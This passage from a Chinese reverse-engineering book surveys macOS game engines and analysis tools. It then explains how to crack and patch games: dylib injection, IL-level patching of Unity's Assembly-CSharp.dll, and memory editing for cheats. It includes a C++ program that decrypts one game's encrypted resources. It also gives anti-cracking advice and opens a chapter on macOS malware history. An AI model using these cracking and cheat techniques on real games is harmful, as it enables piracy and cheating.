首先，不同的游戏引擎对游戏开发中的接口定义是不同的，但经过几十年的发展，游戏引擎已经约定俗成地使用一些统一的名词俗语来表达游戏中的对象与动作。如Sprite表示一个精灵对象，是游戏中的一个实体，类似于程序开发中的Object对象；Scene则表示游戏中的一个场景，苹果使用SpriteKit与SceneKit来命名自家游戏框架产品，从名称上大致就能够猜出它们用于游戏开发。

SpriteKit是苹果公司在iOS 7/OSX 10.9时发布的一款游戏开发框架，以往在苹果系统上开发游戏，可以选择的游戏引擎框架只能来自第三方，这与苹果讲究软件生态圈的价值观存在着某种意义上的冲突，出于完善生态圈或其他商业化的目的，苹果决定推出自家的游戏开发框架。SpriteKit作为WWDC 2013大会上推出的一个亮点“产品”，其雄心肯定是想在苹果系统的游戏开发领域分一杯羹。SpriteKit是一个2D游戏引擎框架，与Cocos2d一样，目标市场是2D游戏的开发人员。为了全方位地介绍SpriteKit的特性，苹果在WWDC 2013大会上通过两个议题来展示SpriteKit的功能细节，它们分别是“Session 502 Introduction to Sprite Kit” $ ^{①} $与“Session 503 Designing Games with Sprite Kit SpriteKit” $ ^{②} $。

与2D游戏引擎框架对应的是3D游戏引擎框架，后者开发出的游戏呈3D立体显示效果，玩家的用户体验更加接近真实世界，展示效果也更逼真，开发的难度与成本也更高。苹果除了发布2D的SpriteKit，还发布了一个面向3D游戏开发人员的引擎框架SceneKit。SceneKit在WWDC 2012大会就发布了，主要用于3D游戏开发。苹果在开发这两款引擎的时候就考虑到了它们之间的兼容性，允许通过桥接的方式进行通信。有兴趣的读者可以查看苹果开发文档，了解具体的技术细节。

SpriteKit与SceneKit在以后每一次WWDC大会召开时，都会带来很多新的特性与变化，比如在WWDC 2014大会上，SpriteKit加入了SKShader着色器、SKLightNode光源节点、SKConstraints约束等；在WWDC 2015大会上，SpriteKit又加入了Viewport视口、SKCameraNode摄像机节点、SKAudioNode声源节点、SKReferenceNode引用节点等。同样，SceneKit也在不停地更新进化着，但它最后会获得怎样的市场表现，还不好说，原因有以下几点。

   </div>

口稳定性。商业游戏最先考虑的是游戏的稳定性，而苹果自家的框架还处于快速发展阶段，API接口每次更新都有较大的调整与变化，离比较稳定还有一定的距离，框架中的Bug对游戏的运行效果可能会有较大的影响，对于潜在的稳定性问题，游戏开发人员通常会选择开源的引擎或者商业化成熟的方案，而拒绝使用不稳定的Bug产品。

易用性与学习成本。SpriteKit与SceneKit出现得比较晚，市面上有成熟的商业产品Unity3D与开源的Cocos2d-x，大多数游戏开发人员掌握了这些游戏开发技巧后，如果再学习新的框架，势必会花掉大量时间与精力，这对于很多个人与公司都是不能接受的，除非使用新的框架后能够获得比原有框架更好的展示效果或更低的维护成本，但显然苹果自家的框架目前并没有这些优点。

跨平台。目前游戏的跨平台几乎成为了标配，支持多个平台的游戏开发是游戏引擎的一个亮点，苹果自家的框架只支持在苹果设备上运行，这一限制会极大地影响SpriteKit与SceneKit的使用率，因为使用它们来开发游戏，就意味着放弃了游戏在Windows/Android等热门系统上的跨平台性，或者需要额外花大量精力再为这些平台独立开发游戏，这会在游戏的推广与效益上造成不小的影响。

虽然有这么多不足，但这并不阻止苹果对于自家游戏框架发展的信心。最后，展示一下在WWDC 2014大会上，议题“Session 610 Building a Game with SceneKit”中，使用SceneKit开发的Bananas游戏的运行效果，如图11-1所示。

 </div>

#### 11.2.2 GameplayKit & ReplayKit

GameplayKit与ReplayKit是在WWDC 2015大会上发布的另外一款游戏开发框架的解决方案，作用也是为了方便开发者更加便捷地开发出基于苹果SDK的游戏产品。

GameplayKit开发的游戏支持在macOS、iOS与tvOS上运行，从框架名称上就可以看出，该框架更加注重“play”方面的设计，它提供了游戏资源、模块、玩法设计以及系统规则方面的内容，与SpriteKit相比，它更加轻便。另外，它不包含视觉渲染等功能，可以应用于2D与3D游戏的开发。

ReplayKit强调了“Replay”回放功能，它可以让玩家在游戏中录制游戏视频、添加语音评论、分享到社交网络。功能上处处可见的人性化接口设计，会让该框架使用率比GameplayKit高一些，后者虽然可以配合AppKit开发独立的游戏，但功能上比SpriteKit都要弱，因此GameplayKit的市场定位略显尴尬。

另外，这两款框架是由新系统iOS 9与OS X 10.11引进的，在低版本的系统中无法使用。游戏厂商基于系统兼容性的考虑，在选择技术方案的时候可能会拒绝使用它。

#### 11.2.3 Cocos2d-x

把Cocos2d-x拿到后面来讲，并不意味着它的重要性与使用率较低，恰恰相反，Cocos2d-x是一款比较成熟的游戏引擎。更难得的是，它是由国内技术公司维护的一款开源产品，最主要的亮点在于它支持多语言多系统，同时支持JavaScript、Lua、C++语言，支持开发的游戏在iOS、Android、Tizen、Windows Phone、macOS、Windows、BlackBerry、Linux以及浏览器中运行，是目前市面上支持语言最多、运行平台最广的一款免费游戏引擎。许多中小型游戏公司开发的游戏都采用该框架，关于Cocos2d-x游戏开发的书更是琳琅满目。可以说，目前Cocos2d-x在国内的游戏领域占据了半壁江山。相信随着苹果系统的普及，之前使用Cocos2d-x开发手游、页游的游戏公司会很快支持苹果系统。

Cocos2d-x引擎的代码托管到了GitHub上 $ ^{①} $，在官网 $ ^{②} $上提供了一个免费的游戏开发工具包Cocos，集合了Cocos2d-x引擎、游戏开发环境与游戏管理工具，可以下载安装使用。安装好Cocos后，Cocos2d-x引擎就已经配置完毕了。运行Cocos，点击界面上的New Project创建工程，输入工程名，选择工程存放路径后，点击Create，游戏就会创建完成，如图11-2所示。

 </div>

创建完成后，会在Cocos列出创建成功的工程，并且会在工程的右侧显示3个图标，分别是使用Xcode、Android Studio、Cocos Studio打开工程。点击第一个按钮，使用Xcode打开工程，在Xcode工具栏上选择Desktop版本，让编译的项目在macOS上运行。最后，点击三角键头Build And Run，让游戏跑起来，效果如图11-3所示。

 </div>

编译生成的Hello Game游戏，大小有10.2MB。查看它的内容，可以看到位于游戏macOS目录下的主程序占用了9.3MB，占用了游戏的大部分空间。出现这种结果的原因是Cocos2d-x引擎的代码是被静态链接到游戏当中的，在安装的Cocos的Cocos2d-x/Cocos2d-x-3.x/prebuilt/mac目录下，有“libCocos2d Mac.a”、“libScocos2d Mac.a”、“libluacocos2d Mac.a”、“libsimulator Mac.a”这4个静态库文件，前3个分别是C++/Javascript/Lua语言开发游戏时链接的库，最后一个是编译模拟器版本时使用的库。这些静态库中导出的符号在链接游戏时被保留到了游戏当中，在实际的分析过程中，这种未经定制而开发出来的游戏，符号信息丰富，安全性较低。

#### 11.2.4 Unity3D

Unity3D是一款老牌的3D游戏引擎，也是市面上使用率最高的3D游戏引擎。它是一款商业产品，同时支持多种系统操作，支持的编程语言有JavaScript、C#、Boo，目前开发手游与端游使用C#语言居多。使用Unity3D需要学习的知识相比前面介绍的引擎要多出不少，学习门槛较高，这使得同级别的Unity3D程序员的工资比起Cocos2d-x要高一些。

虽然Unity3D引擎采用商业化授权并且闭源，但它允许游戏公司购买商业化的Unity3D引擎源代码，来实现游戏引擎的定制。这无论对于游戏开发人员，还是从事游戏安全、逆向分析的人员来说，都是非常有意义的。比如针对一款Cocos2d-x开发的游戏，在逆向分析游戏打怪PK逻辑过程时，参考游戏的源代码可以快速找到分析的关键点。对于那些经过定制化的Cocos2d-x引擎开发的游戏，在分析它们的资源加密等场景时，阅读引擎的源代码也有助于我们快速找到突破口。

使用Unity3D引擎开发的游戏，通常比使用Cocos2d-x开发的游戏体积更大，算是大中型游戏，这类游戏常见于游戏发布平台，比如知名的游戏发布平台Steam（类似于苹果的App Store），游戏开发商可以在平台上发布和宣传游戏，Steam平台提供了一组API供游戏开发商使用，包含好友系统、社交评论、道具购买等。Steam运行效果如图11-4所示。

 </div>

   </div>

Steam上下载与购买的游戏都安装在~/Library/Application Support/Steam/steamapps/common/目录下，每个单独的游戏都是一个完整的游戏软件包，与其他普通的软件目录结构完全一样。运行时由Steam客户端调用，通过Steam API与游戏进行通信，单独运行游戏会弹出错误提示，图11-5是Finder中双击运行游戏Zombie Defense的错误提示。

 </div>

每个使用Unity3D引擎开发的游戏都有自己的目录特征，很容易识别出一个游戏是否是采用Unity3D开发的。以下是Zombie Defense游戏目录的部分内容：

43 directories, 198 files

最明显的识别方法是Contents/Data/Managed/Assembly-CSharp.dll文件，该文件是游戏代码的核心内容，即游戏运行时需要执行的代码。它是一个使用C#语言开发的DLL动态链接库，Unity3D使用跨平台的C#运行时库Mono来实现C#语言游戏的支持。目录中存在着许多level开头、assets结尾的文件，它们是Unity3D保存的游戏关卡与资源的信息。Plugins目录下的CSteamworks.bundle文件表明该游戏是Steam平台游戏，该Bundle目录下的libsteam_api.dylib是Steam API的核心，负责游戏与Steam客户端的通信。

### 11.3 游戏分析工具

对游戏进行分析是必要的，游戏分析通常存在于以下场景。

口 游戏测试。包括游戏的性能测试、Bug调试、漏洞测试与安全风险评估。进行测试的人员可以来自游戏开发公司，也可以是第三方安全评估团队。对于前者来说，分析游戏可以基于源代码级的白盒测试，而后者则使用总结出的一套测试方法进行黑盒测试。在黑盒

测试过程中，就难免会有逆向分析游戏的情况出现。

口破解汉化。破解汉化在国内兴起很多年了。在国内，会有许大大小小的组织或个人喜欢对当前热门的游戏进行破解和汉化，最终状态是让用户在免费的前提下，更加方便地体验游戏。对于加密级别较高的游戏，破解与资源提取都需要较专业的游戏逆向分析技术。

□竞品分析。分析市面上已有的同类型产品，对技术进行原理性的探索，以及对竞品游戏资源进行窃取，更有甚者还会分析出游戏的Bug，找到漏洞，对竞品公司的游戏进行攻击。

☐ 木马查杀。很多恶意软件会伪装成游戏在网络上传播，识别与查杀这类程序是许多安全公司每天做的事情。

口 外挂制作。游戏市场存在着很大的利润空间，这样的环境滋生了很多游戏工作室。游戏外挂作为游戏工作室的必备“武器”，自然是必不可少的。外挂的制作就涉及非常专业的游戏逆向分析技术。另外，部分游戏玩家为了体现更高级别的游戏体验，也会选择使用或制作外挂，这在国内是一种比较常见的现象。

不同类型的游戏，分析方法与使用到的工具可能有所不同。按照分析方法来划分，使用到的工具可以分为静态分析工具与动态分析工具；按照分析的游戏状态不同，又可以分为静态资源修改工具与动态内存修改工具。

其中，有些工具是通用的，有些是专用的，掌握好这些工具的使用，了解工具的原理，不仅可以提高游戏分析的效率，而且可以自己动手，在原有的工具基础上进行扩展，开发出更加方便实用的工具。

#### 11.3.1 静态分析工具

游戏属于程序，无论是运行在浏览器中、PC上，还是运行在游戏机里，分析游戏本质上就是分析程序。分析游戏最初步的是运行游戏，使用静态分析工具快速查看游戏，了解游戏的类型与分析难度。对于低安全级别的游戏，有时候使用静态分析工具就可以完成分析工作。

IDA Pro是静态分析工具中最强大、使用最多的工具。它同时支持静态分析游戏程序，分析方法与分析普通程序别无二致。另外，Hopper也是一款静态分析工具，使用的频率也比较高。这两款工具都针对于使用Objective-C、Swift、C/C++语言开发的游戏。要分析其他语言开发的游戏，则需要使用其他静态分析工具。

对于使用Lua开发的游戏，如基于Cocos2d-x引擎的游戏，如果脚本没有加密，那么直接阅读Lua脚本代码，分析游戏逻辑即可。如果没有做强加密，只是发布的游戏中采用Lua字节码，在分析的时候可以使用Lua字节码反编译工具，例如LuaDec $ ^{①} $。遇到强加密的Lua游戏，就可能需要分析Lua字节码，有兴趣的读者可以阅读http://bbs.pediy.com/showthread.php?p=1274833来了解Lua字节码的更多细节，此处不再展开。

对于使用C#开发的游戏，如基于Unity3D引擎的游戏，在分析的时候，就需要使用C#语言程序静态分析用到的工具，对Contents/Data/Managed/Assembly-CSharp.dll文件进行静态反汇编分析，可用的工具有ILSpy $ ^{①} $或者.NET Reflector $ ^{②} $。前者是免费开源产品，后者是商业软件，它们都只能在Windows系统上运行。由于ILSpy是开源的，再加上C#语言对macOS系统的运行支持，有热心的网友实现了ILSpy的macOS移植：ILSpyMac $ ^{③} $），ILSpyMac是命令行程序，需要在终端中执行反编译后，将生成的cs代码拿到IDE中阅读分析。

如果是使用JavaScript开发的游戏，则只需要将js代码格式化后，拿到文件编辑器或JavaScript开发IDE中阅读分析即可。

#### 11.3.2·动态调试工具

动态调试的工具与方法与调试普通程序几乎一样，使用最多的同样是IDA Pro与Hopper，命令行程序则使用gdb与11db。此处不再赘述。

#### 11.3.3 资源修改工具

有时候，分析游戏的目的只是为了获得游戏中的资源，这时就需要对游戏资源文件格式有所了解。一些目录格式规范，或者未加密的游戏，游戏中的资源都可以从程序包中直接取出，比如前面介绍的使用SceneKit开发的游戏Bananas，编译打包后，它的目录结构如下：

整个游戏包的大小近20MB，主程序Bananas只有340KB，资源、声音、特效等文件占据了游戏的绝大多数空间，这些资源文件如下所示。

wav/caf。声音文件。游戏中的声效文件。在SceneKit编写的游戏中，可以调用SKAction类的playSoundFileName(方法来播放音效。

□ dae。3D模型文件。它可以是一个角色对象，也可以是一个场景，或者是一个动画效果。

在苹果系统中可以在选择dae文件后，按键盘上的空格键查看3D模型的效果，可以拖动鼠标来旋转查看它。在游戏中，可以初始化SCNScene类，传入路径参数，来实例化一个SCNScene，也可以实例化一个SCNSceneSource，调用它的方法entryWithIdentifier()来实例化其他类型的对象，如CAAnimation、SCNLight、NSImage、SCNCamera，等等。

□png。贴图或粒子特效文件。它可以直接实例化成一个精灵节点，只需要调用SKSpriteNode类的SpriteNodeWithImageNamed()方法，传入png文件的资源路径，就会实例化一个SKSpriteNode精灵节点对象。

□ scnp。粒子特效。在游戏中可以调用NSKeyedUnarchiver类的unarchiveObjectWithFile()方法来加载生成一个SCNParticleSystem粒子系统。

☐ fsh/vsh。使用Metal或OpenGL编写的自定义渲染着色配置脚本。内容是文件配置。

在实际的商业项目中，以上这些文件可能会做加密处理，当加载的时候再解密资源，在分析的过程中，有可能需要用到动态调试。

对于Cocos2d-x游戏的资源，分析与提取是相对简单的，有Cocos2d-x的源代码可以参看，无论加密与否，都很容易定位到关键地方，对资源进行提取，此处不再展开。

使用Unity 5开发的游戏，资源都被打包Asset与Asset bundle，前者是以扩展名assets结尾的文件，后者以扩展名“unity3d”结尾。目前网上已有工具可以直接对它们进行解包，该工具是DisUnity $ ^{①} $，解包Asset执行命令disunity asset unpack，解包Asset bundle执行disunity bundle unpack。以下是使用DisUnity解包Steam平台游戏Zombie Defense的输出结果：

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Path ID</td><td style='text-align: center; word-wrap: break-word;'>Offset Length</td><td style='text-align: center; word-wrap: break-word;'>Type ID</td><td style='text-align: center; word-wrap: break-word;'>Class ID</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1</td><td style='text-align: center; word-wrap: break-word;'>00000000</td><td style='text-align: center; word-wrap: break-word;'>976</td><td style='text-align: center; word-wrap: break-word;'>150</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>000003d0</td><td style='text-align: center; word-wrap: break-word;'>260</td><td style='text-align: center; word-wrap: break-word;'>21</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3</td><td style='text-align: center; word-wrap: break-word;'>000004d8</td><td style='text-align: center; word-wrap: break-word;'>152</td><td style='text-align: center; word-wrap: break-word;'>21</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>00000570</td><td style='text-align: center; word-wrap: break-word;'>344</td><td style='text-align: center; word-wrap: break-word;'>21</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>5</td><td style='text-align: center; word-wrap: break-word;'>000006c8</td><td style='text-align: center; word-wrap: break-word;'>164</td><td style='text-align: center; word-wrap: break-word;'>21</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>6</td><td style='text-align: center; word-wrap: break-word;'>00000770</td><td style='text-align: center; word-wrap: break-word;'>164</td><td style='text-align: center; word-wrap: break-word;'>21</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7</td><td style='text-align: center; word-wrap: break-word;'>00000818</td><td style='text-align: center; word-wrap: break-word;'>112</td><td style='text-align: center; word-wrap: break-word;'>21</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>00000888</td><td style='text-align: center; word-wrap: break-word;'>108</td><td style='text-align: center; word-wrap: break-word;'>21</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>...</td><td style='text-align: center; word-wrap: break-word;'>...</td><td style='text-align: center; word-wrap: break-word;'>...</td><td style='text-align: center; word-wrap: break-word;'>...</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>59</td><td style='text-align: center; word-wrap: break-word;'>002d4b48</td><td style='text-align: center; word-wrap: break-word;'>784</td><td style='text-align: center; word-wrap: break-word;'>90</td></tr></table>

$ disunity asset unpack ~/Library/Application\ Support/Steam/steamapps/common/Zombie\ Defense/ZombieDefenseOSX.app/Contents/Data/sharedassets16.assets

#### 11.3.4 内存修改工具

静态修改游戏程序与资源容易触发游戏安全检测，导致游戏运行时行为异常，内存修改是一种比较常见且非常有效的游戏分析方法。对游戏的内存进行分析与修改，也是游戏外挂辅助工具制作的基本方法。

在Windows平台，游戏内存修改器有著名的工具Cheat Engine（简称CE），它可以读取游戏与软件的内存，实现内存中修改与查找指定类型的数据，支持锁定内存与反汇编内存中的数据为汇编代码，功能十分强大。在macOS上，可以使用Cheat Engine的替代器Bit Slicer $ ^{①} $，它几乎涵盖了Cheat Engine的所有功能，是macOS上一款优秀的开源工具。

### 11.4 游戏分析方法

分析游戏与分析其他程序的思路差不多。对于不同类型、不同语言编写的游戏，出于不同的分析目标，分析方法会存在着一些差异。如果是破解游戏，最直接的方法就是运行游戏，查看运行效果，找到特征信息后，反汇编游戏，查看它的反汇编代码定位关键代码。

在实际的分析过程中，游戏的加密强度通常比常规的软件要大，破解难度可能比想象中要大一些，下面总结了一些常见的游戏分析方法，这些方法不仅对游戏分析有效，而且对程序分析也同样有效，因此，本节的内容算是对第6章软件静态分析的扩充。

#### 11.4.1 对比分析

对比分析可分为源代码对比分析法与平台对比分析法,这两种分析方法在实际的逆向过程中都十分常见。下面我们分别进行介绍。

# 1. 源代码对比分析法

源代码对比分析法使用的前提是能够获取目标游戏引擎或核心组件的源代码。在分析过程中，参考引擎的源代码来分析目标游戏。

以笔者分析一款游戏的资源解密为例, 该游戏使用Cocos2d-x引擎开发, 支持在Android、iOS、macOS这3个平台上运行, 游戏的资源经过了加密。现在的需求是将游戏资源解密出来, 并且找到解密算法, 以便游戏更新后可以便捷地提取游戏资源。传统的分析方法是, 在游戏启动还没有

加载场景时下断点单步分析，或者在游戏角色精灵类初始化的地方下断点，查找资源解密与加载的核心代码。这种方法有效，但并不通用，分析不同的游戏，就需要完整地分析一遍，分析的成本也比较高，这种分析方法主要针对未知游戏引擎开发的游戏。而Cocos2d-x引擎是开源的，在分析过程中，可以参考引擎加载资源的代码，找到资源合适的解密点。经过分析，游戏使用了Cocos2d-x引擎的3D版本——Cocos3D引擎。下载引擎的源代码后，查找资源加载部分代码，最终找到了核心的加密部分。游戏解密的方法，调用序列是： $ \text{Cocos2d::FileUtils::getNew-Filename()}\rightarrow\text{Cocos2d::FileUtils::getDataFromFile()}\rightarrow\text{CCResourcePacket::Resource_Load()} $，内部调用了 $ \text{Cocos2d::FileUtils::GetResourcePacket()} $方法。对比 $ \text{Cocos2d-x引擎源代码的CCFileUtils.h文件} $，发现并没有该方法。反汇编分析后发现实际上是调用了 $ \text{Cocos2d::FileUtils::decryptSimple()} $方法，该方法同样不属于 $ \text{Cocos2d-x引擎的代码} $，是定制化加密的核心部分，查看它的交叉引用，发现Bundle3D对象加载时也该用该方法，调用路径为 $ \text{Cocos2d::Bundle3D::load()}\rightarrow\text{Cocos2d::Bundle3D::loadBinary()}\rightarrow\text{Cocos2d::Data::decryptSimple()} $，分析 $ \text{DecryptSimple()} $方法的代码，发现它只是简单的查表操作，最终解密出资源解密代码如下：

int main(int argc, char* argv[])
{
    unsigned char g_decryptCode[256] = {.....};

    if (argc != 2)
    {
        std::cout << "usage: decrypt xxx.c3b" << std::endl;
        return 0;
    }
    std::string filename(argv[1]);
    std::string out_filename(filename + ".out");
    std::string data = load_string_from_file(filename);
    if (data.empty() || (data.length() <= 4))
    {
        std::cerr << "read c3b file error" << std::endl;
        return -1;
    }
    std::string result("");
    for (size_t i = 4; i < data.length(); ++i)
    {
        unsigned char n = data[i];
        unsigned char dd = g_decryptCode[n];
        result.append(1, (char)dd);
    }
    save_string_to_file(out_filename, result);
    std::cout << "done." << out_filename << " generated." << std::endl;
    return 0;
}

# 2. 平台对比分析法

平台对比分析法是另一种比较取巧的分析方法。如今大多数游戏都会推出多个平台的版本，不同版本的游戏架构、资源加解密、核心算法通常是一样的。如果在分析一个平台版本的游戏时

遇到了阻碍，那么可以尝试分析该产品的其他平台，如分析Android平台版本或Windows Phone版本。这就好比木桶原理，整个游戏的安全性体现在多个平台的游戏安全性的基础上，如果其中一个平台的安全性较低，那么很可能会影响整体的安全性。

这种分析方法同样适用于跨平台的软件App，拿国产的流行App“微信”来说，它同时支持Windows、Windows Phone、Android、iOS、macOS等多个平台，在该App早期Windows Phone版本中，由于该手机平台在7.5版本时被成功越狱，手机中安装的所有软件都可以以未加密的形式导出，Windows Phone版本的微信是使用C#开发的，且没有做任何加密与混淆措施，过度依赖系统的安全性，导致系统出现大的安全问题时，软件的安全防线彻底瓦解，最终导致可以使用ILSpy这一类分析工具导出微信完整版本的客户端源代码，稍加修改后就可以编译完成与服务端通信。后来微信官方意识到了问题的严重性，对安全进行了重新部署，采用了封号或低版本系统直接拒绝运行等措施，在macOS系统上放弃支持用户名密码登录，在Windows系统上使用VMP虚拟机加壳，在Android系统上使用动态加载等技术，全面有效地提高了App的安全性。

#### 11.4.2 动态调试

动态调试的作用不言而喻，拿对比分析来说，在分析过程中，单纯地阅读反汇编代码，很可能无法分析出核心有价值的内容，尤其是经过强加密的游戏，此时动态调试就派上了用场。动态调试的难点在于如何设置断点，在何处、何时成功设置断点，是动态调试的关键所在。分析苹果自家引擎开发的游戏，需要对苹果的框架API有所了解；分析Cocos2d-x引擎开发的游戏，则需要对引擎的工作原理非常熟悉。具体案例需要具体对待，与开发游戏一样，这也是经验之谈，只有长期积累的调试经验，才能在分析过程中轻车熟路。

#### 11.4.3 静态补丁

对游戏进行静态补丁，最典型的应用是游戏破解。对于苹果自家引擎与Cocos2d-x引擎开发的游戏，可以使用前面介绍的静态注入工具insert_dylib或yololib对游戏进行静态注入。这种注入方法有两种方案可以实现对游戏的静态补丁，一种是将核心的补丁代码写入dylib，注入游戏中，手动修改游戏代码，跳转到dylib中执行；另一种是静态注入的dylib在程序启动时自动加载，Hook住程序的破解部分，达到动态Hook破解的目的。

对于Unity3D开发的游戏，就麻烦一些了。目前还没有可行反汇编动态调试DLL的方案，常见的Unity3D游戏破解方法是，静态补丁游戏的Contents/Data/Managed/Assembly-CSharp.dll文件，补丁DLL文件目前有以下两种方法。

□ monodis/llasm。基于IL指令级补丁技术。C#是微软公司开发出的编辑语言，本身提供了Ildasm/llasm工具，用来反编译与回编译DLL文件。到了macOS系统上，可以使用Mono提供的monodis/llasm，它们用来代替Windows系统上的Ildasm/llasm，提供了相同的反编译与回编译功能。具体的补丁方法是先使用monodis将DLL文件编译成中间的IL反汇编文件，

   </div>

修改IL文件中的指令，完成补丁工作，然后使用ilasm将IL文件编译成DLL文件，这种补丁方法与Android系统上使用ApkTool补丁APK的方法差不多。

DLL文件补丁。使用.NET Reflector配置插件Reflexil直接操作DLL文件，直接添加、修改、删除DLL文件中的类、方法与字段，甚至支持编写C#代码，直接编译修改补丁到DLL文件中，功能十分强大，是破解Unity3D游戏的必备神器，不过该工具是商业收费软件，并且只支持在Windows系统上运行。

#### 11.4.4 动态补丁

对游戏进行动态补丁，通常不是应用于游戏破解，而是对游戏进行分析，实现游戏外挂或其他目的。具体到工具上，可以使用前面介绍的osxinj对游戏进行动态注入，这种动态注入技术同样适合补丁Unity3D游戏，不过操作起来难度较高，需要找到游戏DLL中需要补丁的地方，本地编写DLL补丁文件，反编译后获取它的字节码，接着编写注入库，在库中注入游戏进程，查找游戏DLL文件所在的地址，定位分析游戏方法地址，最后将前面生成的补丁内容补上去。

虽然原理比较简单，但实际编写工具时，可能会遇到内存页读写保护、字节码错误、段对齐等多个细节问题。

### 11.5 防破解技术

在游戏界，很多厂商与游戏开发人员会斥责游戏破解者们，把他们比喻成游戏建筑界的“老鼠”，他们认为，创建一个游戏就像建一栋高楼大厦，创造的过程是艰辛的。游戏破解者们破解游戏，就好像老鼠破坏建筑一样，毫无技术可言，只是给建筑打洞而已。这样的行为不但破坏了游戏世界的和平，而且伤害了开发人员的感情。而破解人员则声称自己的破解行为并不是为了利益，而是对技术的挑战，破解游戏后，他们都会免费放到网络上供人们下载，一方面是为了方便广大的游戏爱好者，另一方面，是为了让游戏开发商加强游戏安全，也是对游戏厂商的一种有力督促。

无论阅读本书的读者朋友支持哪一种观点，都不得不面临一个事实，游戏破解与防破解技术是对立的，它们以前存在，并且以后在很长的一段时间里会一直存在。并且，随着破解技术的兴起与广泛传播，防破解技术也会持续地更新换代，破解门槛则会不停地水涨船高，这也是游戏生态圈健康发展的必经之路。

日前，macOS上的游戏尤其是热门的游戏并不多，游戏数目以及游戏破解与防破解技术也比较少，与成熟的Windows系统相比，还只是处于初步发展阶段。下面总结的反破解方法，一部分源于其他系统平台上常见的游戏防破解方法，另一部分源于笔者对游戏安全的思考。目前可行的防破解手段有如下4种。

平台弱依赖。游戏的安全依赖于游戏的发布平台，如App Store、Steam。如果游戏的销售完全依赖于这些平台，那么在平台的安全隐患比较恶劣的情况下，可能会出现“全灭”的状况发生。在Google Play与App Store上都发生过类似的事件，这些平台的IAP接口一旦出现漏洞，将导致平台上的游戏被批量破解。因此，建议除了依赖平台外，游戏自身也要在关键的逻辑中加入安全验证代码。

☐ 静态编译瘦身。在游戏中导入使用的静态库，尽可能删除游戏中未使用的符号。

☐ 引擎定制化。对于开源的游戏引擎，可以采用定制化方案，从而加强游戏的安全性，包括JavaScript脚本加密、Lua自定义脚本字节码，资源加密存储与加载时解密等。

☐ 服务端反外挂。对于网络游戏，建立运营团队与安全响应平台，及时对抗外挂的出现。

### 11.6 本章小结

本章介绍了macOS上常见的游戏开发引擎，讨论了它们的使用场景、开发的游戏的特点以及破解方法，最后总结了常见的游戏防破解方案。对游戏开发与逆向感兴趣的读者，可以继续深入研究。

# 恶意软件与Rootkit

近年来，苹果系统的市场占有率正在逐年上升。2016年，恶意软件的曝光率比往年要高出很多，而且笔者预测，在接下来的几年里，苹果系统上的恶意软件会越来越多，曝光也会越来越频繁。

出于对安全事件的响应，以及对恶意软件技术的深入分析，安全从业人员需要对恶意软件的运行机制有快速的了解。因此，掌握恶意软件的原理与分析手法是十分重要的。

### 12.1 安全趋势

曾几何时，苹果公司对自家操作系统的安全性自信满满，扬言在macOS系统上不需要安装任何杀毒软件。经历了这些年安全事件的洗礼，时至今日，苹果公司对待安全的态度有了很大的变化。以往，苹果公司的主张是一味打压，封锁安全事件消息，对安全从业人员的态度也比较冷淡，而现在，他们甚至鼓励安全从业人员关注苹果安全，对苹果认可的软件与系统的漏洞给予高额的报酬。苹果系统的安全正在朝着积极的方向迈进。

#### 12.1.1 知名恶意软件

恶意软件有着悠久的历史, 最早被曝光的恶意软件的雏形是20世纪70年代的一个引导扇形病毒, 作者在它的医疗软件中加入了版权保护代码, 中了该病毒的电脑会感染插入到电脑中的软盘, 之后会通过软盘的引导扇区进行传播, 这在当时引起了不小的轰动。

真正让大多数人知道恶意软件应该是2000年的“千禧年蠕虫”病毒事件，那时候笔者刚接解计算机不久，该病毒在短时间内传遍全球，当时接触过计算机或者从事计算机行业的人员，应该都对此事件有所耳闻。

在计算机软件百花齐放的今天，恶意软件存在的意义也发生了翻天覆地的变化，种类也更加“丰富”，它们有引导流量进行广告推广的广告软件、藏入系统中进行潜伏的后门木马、上传系统中敏感信息的商业间谍软件、破坏系统的恶意病毒，以及进行金钱敲诈的勒索软件等。同时，它们的应用场景也比之前更加广泛。目前，有破坏性质的恶意软件已经从黑客行为上升到了国家军

事与战争层面。

那么下面我们就来看看，这些年来macOS都出现过哪些“明星”级的恶意软件。

Flashback病毒应该首当其冲，它首次曝光是在2011年4月。这款病毒的出现使macOS系统的安全问题得到了业内外的广泛关注。这款恶意软件使用Java语言编写，伪装成Flash播放器更新程序，从控制机下载恶意代码并且传播，不需要密码即可感染。Flashback利用了macOS中Java组件的一个漏洞，只要用户访问恶意网页，病毒就能在无知觉中感染系统。可能当时苹果公司不相信这样的安全事件会发生在自家系统上，或者还没有为macOS系统设立安全应急响应部门，总之，Flashback病毒消息被广泛报道之后，苹果公司才放出了相关的Java组件升级补丁。但为时已晚，2011年，感染这款病毒的macOS电脑数量超过了60万台。在这次事件后，从2011年6月1日起，苹果公司强制App Store中的应用启用沙盒机制。沙盒机制限制了App Store中应用程序所能使用的权限和能够访问的资源，在很大程度上降低了恶意代码危害用户系统的可能性。到了系统的10.7版本，为了减少系统被攻击的风险，苹果公司取消在系统中预置的Java和Flash组件。

下一个是WireLurker。这款恶意软件于2014年爆发，在国内安全圈引起了广泛关注。最终的分析结果显示，这款恶意软件由国内开发者开发，可能涉及国内的安全公司，它可以同时感染Mac与iOS设备，最初来源于一个名为“麦芽地”的第三方软件商店。该商店中几百款应用遭到感染，下载过这些应用的苹果设备几乎全部感染。事件爆发后，国内的安全公司几乎都有跟进，发布了各自的安全分析报告，同时推出了针对这款病毒的专查工具与macOS平台的杀毒软件。

iWorm是苹果系统上发现的第一个广泛感染系统的蠕虫病毒，爆发于2015年。这款恶意软件被安装进系统后，会在系统中植入一个后门，采集用户信息，并对用户的系统进行远程控制。如果用户电脑感染了该蠕虫病毒，将极有可能出现数据丢失、银行账户泄露等安全风险。

